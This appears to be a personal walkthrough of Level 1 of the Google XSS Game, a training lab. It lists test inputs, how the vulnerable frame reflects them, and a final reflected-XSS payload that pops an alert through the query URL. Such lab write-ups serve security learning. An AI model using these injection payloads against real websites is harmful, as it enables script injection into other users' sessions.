# Google XSS Game – Level 1: Reflected XSS

---

## 🎯 Mission Description  
This level demonstrates a common cause of cross-site scripting, where user input is directly included in the page without proper escaping.  
You're allowed to interact with the vulnerable frame or modify the URL directly to execute JavaScript.

---

## 🎯 Mission Objective  
Inject a script that pops up `alert(1)` in the frame below.  
Once the alert appears, the level is considered solved.

---

## 🧪 Steps (My Try)

### ✅ Tried:  
`x`  
→ URL:  
```
https://xss-game.appspot.com/level1/frame?query=x
```  
→ Reflected as:  
```html
<b>x</b>
```

---

### ✅ Tried:  
`X">x`  
→ URL:  
```
https://xss-game.appspot.com/level1/frame?query=X">x
```  
→ Reflected as:  
```html
<b>X">x</b>
```  
🔸 This shows we can break out of the attribute or tag.

---

### ✅ Final Payload:  
```html
<script>alert(1)</script>
```

→ URL:  
```
https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script>
```  
🎉 Alert triggered — mission accomplished.

---

## 🧠 Notes  
- Input is reflected inside a `<b>` tag using `innerHTML`
- No escaping or filtering at all
- Classic Reflected XSS vulnerability
- Direct injection with `<script>` tag works

---

## ✅ Status: Solved 🎉
